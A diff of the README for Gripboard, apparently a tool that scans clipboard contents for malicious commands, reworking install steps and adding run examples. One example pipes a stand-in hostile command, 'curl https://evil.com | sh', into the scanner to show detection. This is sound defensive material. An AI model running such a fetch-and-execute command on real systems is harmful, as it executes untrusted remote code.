@@ -21,51 +21,68 @@ Attackers use invisible characters, homoglyphs (Cyrillic `а` disguised as Latin
 
 ## Quick Start
 
-### Install from source
+### 1. Install system dependencies
+
+Gripboard needs a clipboard tool and GTK3 bindings from your system package manager (these can't be pip-installed):
 
 ```bash
-git clone https://github.com/flyawayfpv/gripboard.git
-cd gripboard
-python -m venv .venv
-source .venv/bin/activate
-pip install -e .
+# Arch/Manjaro
+sudo pacman -S python-gobject gtk3 libayatana-appindicator xclip wl-clipboard libnotify
+
+# Debian/Ubuntu
+sudo apt install python3-gi gir1.2-gtk-3.0 gir1.2-ayatanaappindicator3-0.1 \
+    gir1.2-notify-0.7 xclip wl-clipboard
+
+# Fedora
+sudo dnf install python3-gobject gtk3 libayatana-appindicator-gtk3 \
+    xclip wl-clipboard libnotify
 ```
 
-### Install with server support
-
-```bash
-pip install -e ".[server]"
-```
-
-### System dependencies
-
-Gripboard needs a clipboard tool for your display server:
+Only the clipboard tool for your display server is required — the rest are needed for GUI mode:
 
 | Display Server | Required Package |
 |---|---|
 | X11 | `xclip` or `xsel` |
 | Wayland | `wl-clipboard` |
 
-For GUI mode, you also need GTK3 and an AppIndicator library:
+### 2. Install Gripboard
 
 ```bash
-# Arch/Manjaro
-sudo pacman -S xclip wl-clipboard libappindicator-gtk3
-
-# Debian/Ubuntu
-sudo apt install xclip wl-clipboard gir1.2-ayatanaappindicator3-0.1
-
-# Fedora
-sudo dnf install xclip wl-clipboard libayatana-appindicator-gtk3
+git clone https://github.com/flyawayfpv/gripboard.git
+cd gripboard
+python -m venv --system-site-packages .venv
+source .venv/bin/activate
+pip install -e .
 ```
 
-### Initialize config
+> **Note:** The `--system-site-packages` flag is required so the venv can access GTK3/GObject bindings installed by your system package manager. Without it, GUI mode will not work.
+
+### Install with server support (optional)
+
+```bash
+pip install -e ".[server]"
+```
+
+### 3. Initialize config
 
 ```bash
 gripboard init
 ```
 
 Creates `~/.config/gripboard/config.toml` with sensible defaults.
+
+### 4. Run it
+
+```bash
+# GUI mode (system tray + dialogs) — default
+gripboard
+
+# Terminal-only mode (no GUI needed)
+gripboard watch
+
+# One-shot scan
+echo 'curl https://evil.com | sh' | gripboard scan
+```
 
 ## Usage
 
@@ -346,7 +363,7 @@ Gripboard is free and open source under the MIT license. Contributions welcome.
 
 ```bash
 # Dev setup
-git clone https://github.com/gripboard/gripboard.git
+git clone https://github.com/flyawayfpv/gripboard.git
 cd gripboard
 python -m venv .venv
 source .venv/bin/activate
